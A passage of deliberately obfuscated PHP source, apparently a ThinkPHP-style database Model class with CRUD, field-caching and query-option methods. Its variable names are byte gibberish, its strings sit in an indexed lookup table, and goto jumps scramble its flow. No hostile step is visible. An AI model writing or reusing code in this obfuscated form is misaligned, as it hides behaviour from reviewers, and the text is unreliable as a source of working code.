return intval($dêîÎ²†¼Ó); } } goto D‰µ×¨–‡ï; F·óÓŸù‚µ: define($_SERVER[òÀöí][238], 0); define($_SERVER[òÀöí][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\154\145", "\157\162\144\145\162", "\141\x6c\151\141\x73", "\x68\141\166\151\x6e\x67", "\x67\162\x6f\x75\x70", "\154\157\143\153", "\144\x69\x73\164\151\x6e\143\164", "\x61\165\164\157", "\146\151\154\164\x65\x72", "\x76\x61\154\151\x64\141\x74\145", "\162\145\x73\x75\154\x74", "\142\x69\156\x64", "\x74\157\153\145\156"); public function __construct($AÆªáº¸â = '', $BÈ³ø»Æß = '', $B“ŞññàÌ÷ = '') { $eõõ·É—Î¶ =& $_SERVER[òÀöí]; $this->_initialize(); if (!empty($AÆªáº¸â)) { if (strpos($AÆªáº¸â, $eõõ·É—Î¶[94])) { list($this->dbName, $this->name) = explode($eõõ·É—Î¶[94], $AÆªáº¸â); } else { $this->name = $AÆªáº¸â; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($BÈ³ø»Æß)) { $this->tablePrefix = $eõõ·É—Î¶[33]; } elseif ($eõõ·É—Î¶[33] != $BÈ³ø»Æß) { $this->tablePrefix = $BÈ³ø»Æß; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($eõõ·É—Î¶[240]); } $this->db(0, empty($this->connection) ? $B“ŞññàÌ÷ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $C¥Êß™ºëÆ =& $_SERVER[òÀöí]; if (empty($this->fields)) { if (think_config($C¥Êß™ºëÆ[241])) { $cÓ¦¥ÈĞ§á = $this->dbName ? $this->dbName : think_config($C¥Êß™ºëÆ[242]); $bİ„Å˜éâÄ = think_var_cache($C¥Êß™ºëÆ[243] . strtolower(get_path_this($cÓ¦¥ÈĞ§á) . $C¥Êß™ºëÆ[94] . $this->name)); if ($bİ„Å˜éâÄ) { $BÆº“Û¿‘ = think_config($C¥Êß™ºëÆ[244]); if (empty($BÆº“Û¿‘) || $bİ„Å˜éâÄ[$C¥Êß™ºëÆ[245]] == $BÆº“Û¿‘) { $this->fields = $bİ„Å˜éâÄ; return; } } } $this->flush(); } } public function flush() { goto EØëÑˆ½ì; dæ©¶Ï‘î¦: if (think_config($fÍêãÁåàœ[241])) { $F²ñ™Úˆ£° = $this->dbName ? $this->dbName : think_config($fÍêãÁåàœ[242]); think_var_cache($fÍêãÁåàœ[243] . strtolower(get_path_this($F²ñ™Úˆ£°) . $fÍêãÁåàœ[94] . $this->name), $this->fields); } goto cåÔïğ×‘‘; eæÍÄ•‹— : foreach ($dÙ½å³ËİÊ as $E¥°Óµ™œˆ => $Eõááç¯Ã¼) { $D”‰¿ß§ä”[$E¥°Óµ™œˆ] = $Eõááç¯Ã¼[$fÍêãÁåàœ[29]]; if ($Eõááç¯Ã¼[$fÍêãÁåàœ[36]]) { $this->fields[$fÍêãÁåàœ[247]] = $E¥°Óµ™œˆ; if ($Eõááç¯Ã¼[$fÍêãÁåàœ[39]]) { $this->fields[$fÍêãÁåàœ[246]] = !0; } } } $this->fields[$fÍêãÁåàœ[248]] = $D”‰¿ß§ä”; if (think_config($fÍêãÁåàœ[244])) { $this->fields[$fÍêãÁåàœ[245]] = think_config($fÍêãÁåàœ[244]); } goto dæ©¶Ï‘î¦; Cô™½Ûî: if (!$dÙ½å³ËİÊ) { return !1; } $this->fields = array_keys($dÙ½å³ËİÊ); $this->fields[$fÍêãÁåàœ[246]] = !1; goto eæÍÄ•‹— ; EØëÑˆ½ì: $fÍêãÁåàœ =& $_SERVER[òÀöí]; $this->db->setModel($this->name); $dÙ½å³ËİÊ = $this->db->getFields($this->getTableName()); goto Cô™½Ûî; cåÔïğ×‘‘: } public function switchModel($bë”ÀœåÑ¡, $aõ ‡çÏƒ = array()) { $CŠ•àÜã»Ï =& $_SERVER[òÀöí]; $b÷­×“âÚÎ = ucwords(strtolower($bë”ÀœåÑ¡)) . $CŠ•àÜã»Ï[249]; if (!class_exists($b÷­×“âÚÎ)) { think_exception($b÷­×“âÚÎ . think_lang($CŠ•àÜã»Ï[250])); } $this->_extModel = new $b÷­×“âÚÎ($this->name); if (!empty($aõ ‡çÏƒ)) { foreach ($aõ ‡çÏƒ as $A¯çŞÀÛÏ) { $this->_extModel->setProperty($A¯çŞÀÛÏ, $this->{$A¯çŞÀÛÏ}); } } return $this->_extModel; } public function __set($DÕ¸É°Üª, $eÜêáëÛ·) { $this->data[$DÕ¸É°Üª] = $eÜêáëÛ·; } public function __get($dÃšìõ¦¦ô) { return isset($this->data[$dÃšìõ¦¦ô]) ? $this->data[$dÃšìõ¦¦ô] : null; } public function __isset($f›Î·òĞ•¡) { return isset($this->data[$f›Î·òĞ•¡]); } public function __unset($fÁİùµ¸’Ş) { unset($this->data[$fÁİùµ¸’Ş]); } public function __call($Eá…¢„ãßí, $DÈëàˆÛ) { $Bâî¥àÔŠ¯ =& $_SERVER[òÀöí]; if (in_array(strtolower($Eá…¢„ãßí), $this->methods, !0)) { $this->options[strtolower($Eá…¢„ãßí)] = $DÈëàˆÛ[0]; return $this; } elseif (in_array(strtolower($Eá…¢„ãßí), array($Bâî¥àÔŠ¯[251], $Bâî¥àÔŠ¯[252], $Bâî¥àÔŠ¯[253], $Bâî¥àÔŠ¯[254], $Bâî¥àÔŠ¯[255]), !0)) { $c°±ó£—Ç = isset($DÈëàˆÛ[0]) ? $DÈëàˆÛ[0] : $Bâî¥àÔŠ¯[182]; $c°±ó£—Ç = $this->db->parseKey($c°±ó£—Ç); return $this->getField(strtoupper($Eá…¢„ãßí) . $Bâî¥àÔŠ¯[256] . $c°±ó£—Ç . $Bâî¥àÔŠ¯[257] . $Eá…¢„ãßí, $Bâî¥àÔŠ¯[251]); } elseif (strtolower(substr($Eá…¢„ãßí, 0, 5)) == $Bâî¥àÔŠ¯[258]) { $c°±ó£—Ç = think_parse_name(substr($Eá…¢„ãßí, 5)); $Fš©®å‰ñ[$c°±ó£—Ç] = $DÈëàˆÛ[0]; return $this->where($Fš©®å‰ñ)->find(); } elseif (strtolower(substr($Eá…¢„ãßí, 0, 10)) == $Bâî¥àÔŠ¯[259]) { $Aõ‚‚åîõ… = think_parse_name(substr($Eá…¢„ãßí, 10)); $Fš©®å‰ñ[$Aõ‚‚åîõ…] = $DÈëàˆÛ[0]; return $this->where($Fš©®å‰ñ)->getField($DÈëàˆÛ[1]); } elseif (isset($this->_scope[$Eá…¢„ãßí])) { return $this->scope($Eá…¢„ãßí, $DÈëàˆÛ[0]); } elseif (method_exists($this, $Eá…¢„ãßí)) { array_unshift($DÈëàˆÛ, $Eá…¢„ãßí); return call_user_func_array(array($this, $Bâî¥àÔŠ¯[260]), $DÈëàˆÛ); } else { return call_user_func_array(array(parent, $Eá…¢„ãßí), $DÈëàˆÛ); } } protected function call() { goto aèªªÑÓŸÃ; aèªªÑÓŸÃ: $D‚øãÍ =& $_SERVER[òÀöí]; $cä§·Š²‰† = func_get_args(); $BÙá¤ª‡î‡ = array_shift($cä§·Š²‰†); goto BªÚºê¦İµ; BªÚºê¦İµ: $BŒø¢«È‚ = $BÙá¤ª‡î‡; if (is_array($BÙá¤ª‡î‡)) { $BŒø¢«È‚ = $BÙá¤ª‡î‡[1]; $BÙá¤ª‡î‡ = $BÙá¤ª‡î‡[0]; } $eË…æ‹î‹ = count($cä§·Š²‰†) - 1; goto cÌìâ·ÆÍ»; cÌìâ·ÆÍ»: if (isset($cä§·Š²‰†[$eË…æ‹î‹]) && $cä§·Š²‰†[$eË…æ‹î‹] === $BÙá¤ª‡î‡) { think_exception(__CLASS__ . $D‚øãÍ[4] . $BÙá¤ª‡î‡ . think_lang($D‚øãÍ[261])); return; } $cä§·Š²‰†[] = $BÙá¤ª‡î‡; if (method_exists($this, $D‚øãÍ[262])) { $F‡ÂùÆªÛ = call_user_func_array(array($this, $D‚øãÍ[263]), array($BŒø¢«È‚, $cä§·Š²‰†)); if (!is_null($F‡ÂùÆªÛ) && $F‡ÂùÆªÛ !== !1) { return $F‡ÂùÆªÛ; } } goto f“ÆŒ–ß‘š; f“ÆŒ–ß‘š: $F°ª˜²¹¡ = call_user_func_array(array($this, $BÙá¤ª‡î‡), $cä§·Š²‰†); if (method_exists($this, $D‚øãÍ[264])) { $F‡ÂùÆªÛ = call_user_func_array(array($this, $D‚øãÍ[265]), array($BŒø¢«È‚, $cä§·Š²‰†, $F°ª˜²¹¡)); if ($F‡ÂùÆªÛ) { return $F‡ÂùÆªÛ; } } return $F°ª˜²¹¡; goto BßÅÈìà‹é; BßÅÈìà‹é: } protected function _initialize() { } protected function _facade($e‚óØ’™ğ) { $E“‡¤Á¶ÄÓ =& $_SERVER[òÀöí]; if (!empty($this->fields)) { foreach ($e‚óØ’™ğ as $e¦œ–×™ïÕ => $EÆ÷¢Ê²œ²) { if (is_array($this->fields) && !in_array($e¦œ–×™ïÕ, $this->fields, !0)) { unset($e‚óØ’™ğ[$e¦œ–×™ïÕ]); } elseif (is_scalar($EÆ÷¢Ê²œ²)) { $this->_parseType($e‚óØ’™ğ, $e¦œ–×™ïÕ); } } } if (!empty($this->options[$E“‡¤Á¶ÄÓ[266]])) { $e‚óØ’™ğ = array_map($this->options[$E“‡¤Á¶ÄÓ[266]], $e‚óØ’™ğ); unset($this->options[$E“‡¤Á¶ÄÓ[266]]); } $this->_beforeWrite($e‚óØ’™ğ); return $e‚óØ’™ğ; } protected function _beforeWrite(&$Eê‚Œâ‘Ù¸) { } public function add($Aš§¥¨ĞŸ = '', $a‚óó»ï¥Ï = array(), $E×±£İÛÜ¡ = false) { goto bĞé–‚­­Â; E©µ³õâ•¿: return $b‘äè»ßõ¯; goto bŞ¦„·ò™; bĞé–‚­­Â: if (empty($Aš§¥¨ĞŸ)) { if (!empty($this->data)) { $Aš§¥¨ĞŸ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[òÀöí][267]); return !1; } } $a‚óó»ï¥Ï = $this->_parseOptions($a‚óó»ï¥Ï); $Aš§¥¨ĞŸ = $this->_facade($Aš§¥¨ĞŸ); goto e±ïñ†ÍÇ; e±ïñ†ÍÇ: if (!1 === $this->_beforeInsert($Aš§¥¨ĞŸ, $a‚óó»ï¥Ï)) { return !1; } $b‘äè»ßõ¯ = $this->db->insert($Aš§¥¨ĞŸ, $a‚óó»ï¥Ï, $E×±£İÛÜ¡); if (!1 !== $b‘äè»ßõ¯) { $Dåôà¸ÍóÖ = $this->getLastInsID(); if ($Dåôà¸ÍóÖ) { $Aš§¥¨ĞŸ[$this->getPk()] = $Dåôà¸ÍóÖ; $this->_after_insert($Aš§¥¨ĞŸ, $a‚óó»ï¥Ï); return $Dåôà¸ÍóÖ; } $this->_after_insert($Aš§¥¨ĞŸ, $a‚óó»ï¥Ï); } goto E©µ³õâ•¿; bŞ¦„·ò™: } protected function _beforeInsert(&$c÷˜ Œ±©•, $cÆŠÁß‚Ûé) { } protected function _after_insert($B®ôÄĞ»¶º, $dÉ¦Œ³ñ‡Ø) { } public function addAll($B‚ôòåª¨ä, $A±¦ñ…“í = array(), $cä±¸Œ¶é = false) { goto AŠŒ«Ù«å; C«‚ëÏ„ÌÄ: return $f©‹Ášº—ó; goto D¨©çç™“˜; AŠŒ«Ù«å: $fÄé¼š–Üê =& $_SERVER[òÀöí]; if (empty($B‚ôòåª¨ä)) { $this->error = think_lang($fÄé¼š–Üê[267]); return !1; } $A±¦ñ…“í = $this->_parseOptions($A±¦ñ…“í); goto aÈÍ÷¿Î¶; aÈÍ÷¿Î¶: foreach ($B‚ôòåª¨ä as $a¿÷ôˆŞÒÁ => $dÆˆÅ·‹ì‘) { $B‚ôòåª¨ä[$a¿÷ôˆŞÒÁ] = $this->_facade($dÆˆÅ·‹ì‘); } if (method_exists($this->db, $fÄé¼š–Üê[268])) { $f©‹Ášº—ó = $this->db->insertAll($B‚ôòåª¨ä, $A±¦ñ…“í, $cä±¸Œ¶é); } else { $this->startTrans(); foreach ($B‚ôòåª¨ä as $a¿÷ôˆŞÒÁ => $dÆˆÅ·‹ì‘) { $f©‹Ášº—ó = $this->db->insert($dÆˆÅ·‹ì‘, $A±¦ñ…“í, $cä±¸Œ¶é); } $this->commit(); } if (!1 !== $f©‹Ášº—ó) { $C´„‰İÑÂ = $this->getLastInsID(); if ($C´„‰İÑÂ) { return $C´„‰İÑÂ; } } goto C«‚ëÏ„ÌÄ; D¨©çç™“˜: } public function selectAdd($fÂŒ„Ù÷¿” = '', $CÉí‰İ•ª¯ = '', $B‹ÓÍ½×ò = array()) { $aÆä×ÜÃÆÁ =& $_SERVER[òÀöí]; $B‹ÓÍ½×ò = $this->_parseOptions($B‹ÓÍ½×ò); if (!1 === ($dèöÃ Á = $this->db->selectInsert($fÂŒ„Ù÷¿” ? $fÂŒ„Ù÷¿” : $B‹ÓÍ½×ò[$aÆä×ÜÃÆÁ[269]], $CÉí‰İ•ª¯ ? $CÉí‰İ•ª¯ : $this->getTableName(), $B‹ÓÍ½×ò))) { $this->error = think_lang($aÆä×ÜÃÆÁ[270]); return !1; } else { return $dèöÃ Á; } } public function save($aŠƒÙ™Ïµ = '', $D‹¥…Û‚”õ = array()) { goto e¹˜„Æƒß; A©Õ¡¦÷ö: $D‹¥…Û‚”õ = $this->_parseOptions($D‹¥…Û‚”õ); $Dˆà‰Â®½Í = $this->getPk(); if (!isset($D‹¥…Û‚”õ[$Eá¾ã™ğ¯é[271]])) { if (isset($aŠƒÙ™Ïµ[$Dˆà‰Â®½Í])) { $Bó®è ˆğ¥[$Dˆà‰Â®½Í] = $aŠƒÙ™Ïµ[$Dˆà‰Â®½Í]; $D‹¥…Û‚”õ[$Eá¾ã™ğ¯é[271]] = $Bó®è ˆğ¥; unset($aŠƒÙ™Ïµ[$Dˆà‰Â®½Í]); } else { $this->error = think_lang($Eá¾ã™ğ¯é[270]); return !1; } } goto c…ØæÆ…È; e¹˜„Æƒß: $Eá¾ã™ğ¯é =& $_SERVER[òÀöí]; if (empty($aŠƒÙ™Ïµ)) { if (!empty($this->data)) { $aŠƒÙ™Ïµ = $this->data; $this->data = array(); } else { $this->error = think_lang($Eá¾ã™ğ¯é[267]); return !1; } } $aŠƒÙ™Ïµ = $this->_facade($aŠƒÙ™Ïµ); goto A©Õ¡¦÷ö; E´‹ùÚÍÃ: if (!1 !== $e†ËÂÄÀÁ…) { if (isset($e¶ö”é÷Ş)) { $aŠƒÙ™Ïµ[$Dˆà‰Â®½Í] = $e¶ö”é÷Ş; } $this->_afterUpdate($aŠƒÙ™Ïµ, $D‹¥…Û‚”õ); } return $e†ËÂÄÀÁ…; goto AñàŠƒ¤–©; c…ØæÆ…È: if (is_array($D‹¥…Û‚”õ[$Eá¾ã™ğ¯é[271]]) && isset($D‹¥…Û‚”õ[$Eá¾ã™ğ¯é[271]][$Dˆà‰Â®½Í])) { $e¶ö”é÷Ş = $D‹¥…Û‚”õ[$Eá¾ã™ğ¯é[271]][$Dˆà‰Â®½Í]; } if (!1 === $this->_beforeUpdate($aŠƒÙ™Ïµ, $D‹¥…Û‚”õ)) { return !1; } $e†ËÂÄÀÁ… = $this->db->update($aŠƒÙ™Ïµ, $D‹¥…Û‚”õ); goto E´‹ùÚÍÃ; AñàŠƒ¤–©: } protected function _beforeUpdate(&$F»òÀ˜„, $fêä½ù¾óµ) { } protected function _afterUpdate($cÒëŸÂ„Äá, $CÍíœÃĞ°) { } public function delete($DÎéÕöŠ˜¶ = array()) { goto b¦¸İ‚…Ûˆ; b¦¸İ‚…Ûˆ: $f’ŸåºèÈœ =& $_SERVER[òÀöí]; if (empty($DÎéÕöŠ˜¶) && empty($this->options[$f’ŸåºèÈœ[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $dÓ¯œ±†§° = $this->getPk(); goto B…Úö†‚›; E÷Á¾ÅÀò†: $Bì©Ø‚Ğ‹ = $this->db->delete($DÎéÕöŠ˜¶); if (!1 !== $Bì©Ø‚Ğ‹) { $BÆ¾Ç›Ã»– = array(); if (isset($d„ò«¡òãÎ)) { $BÆ¾Ç›Ã»–[$dÓ¯œ±†§°] = $d„ò«¡òãÎ; } $this->_after_delete($BÆ¾Ç›Ã»–, $DÎéÕöŠ˜¶); } return $Bì©Ø‚Ğ‹; goto A±ˆ¥²Š; B…Úö†‚›: if (is_numeric($DÎéÕöŠ˜¶) || is_string($DÎéÕöŠ˜¶)) { if (strpos($DÎéÕöŠ˜¶, $f’ŸåºèÈœ[47])) { $CÅ¾İ¨ğÙ[$dÓ¯œ±†§°] = array($f’ŸåºèÈœ[272], $DÎéÕöŠ˜¶); } else { $CÅ¾İ¨ğÙ[$dÓ¯œ±†§°] = $DÎéÕöŠ˜¶; } $this->options[$f’ŸåºèÈœ[271]] = $CÅ¾İ¨ğÙ; } $DÎéÕöŠ˜¶ = $this->_parseOptions(); if (is_array($DÎéÕöŠ˜¶[$f’ŸåºèÈœ[271]]) && isset($DÎéÕöŠ˜¶[$f’ŸåºèÈœ[271]][$dÓ¯œ±†§°])) { $d„ò«¡òãÎ = $DÎéÕöŠ˜¶[$f’ŸåºèÈœ[271]][$dÓ¯œ±†§°]; } goto E÷Á¾ÅÀò†; A±ˆ¥²Š: } protected function _after_delete($C†õÎŒ—¾Ø, $aÂí’ØÎ«î) { } public function select($fŸÀíà¸³Ë = array()) { goto B‹Ê˜™‰“; B‹Ê˜™‰“: $E‰ö¶¼²› =& $_SERVER[òÀöí]; if (is_string($fŸÀíà¸³Ë) || is_numeric($fŸÀíà¸³Ë)) { $E…á„Š„ùÛ = $this->getPk(); if (strpos($fŸÀíà¸³Ë, $E‰ö¶¼²›[47])) { $f¸‰„°ç»É[$E…á„Š„ùÛ] = array($E‰ö¶¼²›[272], $fŸÀíà¸³Ë); } else { $f¸‰„°ç»É[$E…á„Š„ùÛ] = $fŸÀíà¸³Ë; } $this->options[$E‰ö¶¼²›[271]] = $f¸‰„°ç»É; } elseif (!1 === $fŸÀíà¸³Ë) { $fŸÀíà¸³Ë = $this->_parseOptions(); return $E‰ö¶¼²›[273] . $this->db->buildSelectSql($fŸÀíà¸³Ë) . $E‰ö¶¼²›[274]; } $fŸÀíà¸³Ë = $this->_parseOptions(); goto Bğˆ´ƒÈ‘”; Bğˆ´ƒÈ‘”: $B”ã«Í¸áœ = $this->db->select($fŸÀíà¸³Ë); if (!1 === $B”ã«Í¸áœ) { return !1; } if (empty($B”ã«Í¸áœ)) { return null; } goto AÓ‰‚á; AÓ‰‚á: $this->_afterSelect($B”ã«Í¸áœ, $fŸÀíà¸³Ë); return $B”ã«Í¸áœ; goto b“¿²Ş¤Œ; b“¿²Ş¤Œ: } protected function _afterSelect(&$bØßà¶Ş¢Õ, $CÕª‡¶¬Ó˜) { } public function buildSql($Bİ¡‡ƒ© = array()) { $dˆ¬öÅÇ“½ =& $_SERVER[òÀöí]; $Bİ¡‡ƒ© = $this->_parseOptions($Bİ¡‡ƒ©); return $dˆ¬öÅÇ“½[273] . $this->db->buildSelectSql($Bİ¡‡ƒ©) . $dˆ¬öÅÇ“½[274]; } public function optionsValue($f—³Ô¹ˆğ = null) { if (is_null($f—³Ô¹ˆğ)) { return $this->options; } elseif (is_array($f—³Ô¹ˆğ)) { $this->options = array_merge($this->options, $f—³Ô¹ˆğ); } } protected function _parseOptions($E’ªœÌñ£ = array()) { goto AçªïÌßŒ; AçªïÌßŒ: $c£ÌñîğÌ =& $_SERVER[òÀöí]; if (is_array($E’ªœÌñ£)) { $E’ªœÌñ£ = array_merge($this->options, $E’ªœÌñ£); } $this->options = array(); goto d›ÎŠô¦éÒ; d›ÎŠô¦éÒ: if (!isset($E’ªœÌñ£[$c£ÌñîğÌ[275]])) { $E’ªœÌñ£[$c£ÌñîğÌ[275]] = $this->getTableName(); $AáÊßø’ë = $this->fields; } else { $AáÊßø’ë = $this->getDbFields(); } if (!empty($E’ªœÌñ£[$c£ÌñîğÌ[276]])) { $E’ªœÌñ£[$c£ÌñîğÌ[275]] .= $c£ÌñîğÌ[50] . $E’ªœÌñ£[$c£ÌñîğÌ[276]]; } $E’ªœÌñ£[$c£ÌñîğÌ[277]] = $this->name; goto e£ ËÅÒ; e£ ËÅÒ: if (isset($E’ªœÌñ£[$c£ÌñîğÌ[271]]) && is_array($E’ªœÌñ£[$c£ÌñîğÌ[271]]) && !empty($AáÊßø’ë) && !isset($E’ªœÌñ£[$c£ÌñîğÌ[278]]) && !isset($E’ªœÌñ£[$c£ÌñîğÌ[275]])) { foreach ($E’ªœÌñ£[$c£ÌñîğÌ[271]] as $Eæ£µå¦ò => $B¦åÎÕš÷Á) { $Eæ£µå¦ò = trim($Eæ£µå¦ò); if (in_array($Eæ£µå¦ò, $AáÊßø’ë, !0)) { if (is_scalar($B¦åÎÕš÷Á)) { $this->_parseType($E’ªœÌñ£[$c£ÌñîğÌ[271]], $Eæ£µå¦ò); } } elseif (!is_numeric($Eæ£µå¦ò) && $c£ÌñîğÌ[70] != substr($Eæ£µå¦ò, 0, 1) && !1 === strpos($Eæ£µå¦ò, $c£ÌñîğÌ[94]) && !1 === strpos($Eæ£µå¦ò, $c£ÌñîğÌ[256]) && !1 === strpos($Eæ£µå¦ò, $c£ÌñîğÌ[279]) && !1 === strpos($Eæ£µå¦ò, $c£ÌñîğÌ[280])) { unset($E’ªœÌñ£[$c£ÌñîğÌ[271]][$Eæ£µå¦ò]); } } } $this->_options_filter($E’ªœÌñ£); return $E’ªœÌñ£; goto EğÖ§ºŞñ; EğÖ§ºŞñ: } protected function _options_filter(&$FãÄ‡‚«¿ˆ) { } protected function _parseType(&$b™Üğ‡ˆª‘, $Bõ—ç“½¨ƒ) { $D£²âŠöÓ¼ =& $_SERVER[òÀöí]; if (empty($this->options[$D£²âŠöÓ¼[281]][$D£²âŠöÓ¼[4] . $Bõ—ç“½¨ƒ])) { $fÓŒÒ¿ğ³Á = strtolower($this->fields[$D£²âŠöÓ¼[248]][$Bõ—ç“½¨ƒ]); if (!1 !== strpos($fÓŒÒ¿ğ³Á, $D£²âŠöÓ¼[282])) { } elseif (!1 === strpos($fÓŒÒ¿ğ³Á, $D£²âŠöÓ¼[283]) && !1 !== strpos($fÓŒÒ¿ğ³Á, $D£²âŠöÓ¼[284])) { $b™Üğ‡ˆª‘[$Bõ—ç“½¨ƒ] = intval($b™Üğ‡ˆª‘[$Bõ—ç“½¨ƒ]); } elseif (!1 !== strpos($fÓŒÒ¿ğ³Á, $D£²âŠöÓ¼[285]) || !1 !== strpos($fÓŒÒ¿ğ³Á, $D£²âŠöÓ¼[286])) { $b™Üğ‡ˆª‘[$Bõ—ç“½¨ƒ] = floatval($b™Üğ‡ˆª‘[$Bõ—ç“½¨ƒ]); } elseif (!1 !== strpos($fÓŒÒ¿ğ³Á, $D£²âŠöÓ¼[287])) { $b™Üğ‡ˆª‘[$Bõ—ç“½¨ƒ] = (bool) $b™Üğ‡ˆª‘[$Bõ—ç“½¨ƒ]; } } } public function find($D¹–‘ïƒŠô = array()) { goto a‡İåàîÉ›; f—ŸƒÃÒé÷: if (empty($Aø“™Û‘ğ)) { return null; } $this->data = $Aø“™Û‘ğ[0]; $this->_afterFind($this->data, $D¹–‘ïƒŠô); goto dß©‹ƒ¶; dß©‹ƒ¶: if (!empty($this->options[$c¦ÒÀî¡©ä[289]])) { return $this->returnResult($this->data, $this->options[$c¦ÒÀî¡©ä[289]]); } return $this->data; goto e‚Æ®ÙË®œ; a‡İåàîÉ›: $c¦ÒÀî¡©ä =& $_SERVER[òÀöí]; if (is_numeric($D¹–‘ïƒŠô) || is_string($D¹–‘ïƒŠô)) { $cÓ†À ¿¯æ[$this->getPk()] = intval($D¹–‘ïƒŠô); $this->options[$c¦ÒÀî¡©ä[271]] = $cÓ†À ¿¯æ; } $this->options[$c¦ÒÀî¡©ä[288]] = 1; goto còòãà½Ï‚; còòãà½Ï‚: $D¹–‘ïƒŠô = $this->_parseOptions(); $Aø“™Û‘ğ = $this->db->select($D¹–‘ïƒŠô); if (!1 === $Aø“™Û‘ğ) { return !1; } goto f—ŸƒÃÒé÷; e‚Æ®ÙË®œ: } protected function _afterFind(&$Fóù¡àºôÅ, $EÜ•àƒ–°‘) { } protected function returnResult($CÉè¹ˆë‘“, $f†ÜÉ¹˜Å = '') { $BÕ‰¿Å—Å =& $_SERVER[òÀöí]; if ($f†ÜÉ¹˜Å) { if (is_callable($f†ÜÉ¹˜Å)) { return call_user_func($f†ÜÉ¹˜Å, $CÉè¹ˆë‘“); } switch (strtolower($f†ÜÉ¹˜Å)) { case $BÕ‰¿Å—Å[290]: return json_encode($CÉè¹ˆë‘“); case $BÕ‰¿Å—Å[291]: return xml_encode($CÉè¹ˆë‘“); } } return $CÉè¹ˆë‘“; } public function parseFieldsMap($fôŸ¬öÓ·, $fõ­Ôöá“È = 1) { if (!empty($this->_map)) { foreach ($this->_map as $cëîŞ¼Í => $F´›Å¼Â‚À) { if ($fõ­Ôöá“È == 1) { if (isset($fôŸ¬öÓ·[$F´›Å¼Â‚À])) { $fôŸ¬öÓ·[$cëîŞ¼Í] = $fôŸ¬öÓ·[$F´›Å¼Â‚À]; unset($fôŸ¬öÓ·[$F´›Å¼Â‚À]); } } else { if (isset($fôŸ¬öÓ·[$cëîŞ¼Í])) { $fôŸ¬öÓ·[$F´›Å¼Â‚À] = $fôŸ¬öÓ·[$cëîŞ¼Í]; unset($fôŸ¬öÓ·[$cëîŞ¼Í]); } } } } return $fôŸ¬öÓ·; } public function setField($e«Ğ¤×å¡, $BÉ©³±ÏÛÉ = '') { if (is_array($e«Ğ¤×å¡)) { $f‹ˆòŠˆ¼— = $e«Ğ¤×å¡; } else { $f‹ˆòŠˆ¼—[$e«Ğ¤×å¡] = $BÉ©³±ÏÛÉ; } return $this->save($f‹ˆòŠˆ¼—); } public function setAdd($d„Ÿ¤‹¥Ú¸, $F‘‚”á§˜Õ = 1) { $FÆÅòè³ì¿ =& $_SERVER[òÀöí]; $F²‰• †’… = $d„Ÿ¤‹¥Ú¸ . $FÆÅòè³ì¿[292] . $F‘‚”á§˜Õ; if ($F‘‚”á§˜Õ < 0) { $F²‰• †’… = $d„Ÿ¤‹¥Ú¸ . $F‘‚”á§˜Õ; } return $this->setField($d„Ÿ¤‹¥Ú¸, array($FÆÅòè³ì¿[293], $F²‰• †’…)); } public function getField($c¦ßÚªç·¶, $DØÉí ‚á‘ = null) { $bÊÏêñ–Š =& $_SERVER[òÀöí]; $Dß‡÷ƒ½á†[$bÊÏêñ–Š[269]] = $c¦ßÚªç·¶; $Dß‡÷ƒ½á† = $this->_parseOptions($Dß‡÷ƒ½á†); $c¦ßÚªç·¶ = trim($c¦ßÚªç·¶); if (strpos($c¦ßÚªç·¶, $bÊÏêñ–Š[47])) { if (!isset($Dß‡÷ƒ½á†[$bÊÏêñ–Š[288]])) { $Dß‡÷ƒ½á†[$bÊÏêñ–Š[288]] = is_numeric($DØÉí ‚á‘) ? $DØÉí ‚á‘ : $bÊÏêñ–Š[33]; } $Cô®øêòîÍ = $this->db->select($Dß‡÷ƒ½á†); if (!empty($Cô®øêòîÍ)) { goto d±¯¹Àµ…±; d±¯¹Àµ…±: $FÃ†ä´ÂµÍ = explode($bÊÏêñ–Š[47], $c¦ßÚªç·¶); $c¦ßÚªç·¶ = array_keys($Cô®øêòîÍ[0]); $dÆ—ì÷×©ñ = array_shift($c¦ßÚªç·¶); goto F¥¿Åå‘Ñ¬; F¥¿Åå‘Ñ¬: $cĞÌ†ÔŸø = array_shift($c¦ßÚªç·¶); $bïÓå”‡†Ó = array(); $BÑÙ¸ğİˆˆ = count($FÃ†ä´ÂµÍ); goto F¯”ğ§ñË±; F¯”ğ§ñË±: foreach ($Cô®øêòîÍ as $e¶Æ ¨Üñ‘) { $b¢¶ÀÀµªƒ = $e¶Æ ¨Üñ‘[$dÆ—ì÷×©ñ]; if (2 == $BÑÙ¸ğİˆˆ) { $bïÓå”‡†Ó[$b¢¶ÀÀµªƒ] = $e¶Æ ¨Üñ‘[$cĞÌ†ÔŸø]; } else { $bïÓå”‡†Ó[$b¢¶ÀÀµªƒ] = is_string($DØÉí ‚á‘) ? implode($DØÉí ‚á‘, $e¶Æ ¨Üñ‘) : $e¶Æ ¨Üñ‘; } } return $bïÓå”‡†Ó; goto aøÈ´ÆŸ†Ë; aøÈ´ÆŸ†Ë: } } else { if (!0 !== $DØÉí ‚á‘) { $Dß‡÷ƒ½á†[$bÊÏêñ–Š[288]] = is_numeric($DØÉí ‚á‘) ? $DØÉí ‚á‘ : 1; } if ($DØÉí ‚á‘ === $bÊÏêñ–Š[251]) { unset($Dß‡÷ƒ½á†[$bÊÏêñ–Š[288]]); } $e¶Æ ¨Üñ‘ = $this->db->select($Dß‡÷ƒ½á†); if (!empty($e¶Æ ¨Üñ‘)) { if ($DØÉí ‚á‘ === $bÊÏêñ–Š[251]) { return reset($e¶Æ ¨Üñ‘[0]); } if (!0 !== $DØÉí ‚á‘ && 1 == $Dß‡÷ƒ½á†[$bÊÏêñ–Š[288]]) { return reset($e¶Æ ¨Üñ‘[0]); } foreach ($e¶Æ ¨Üñ‘ as $c‘ïŠñÈŞ‘) { $C›ôÉëÆÃŸ[] = 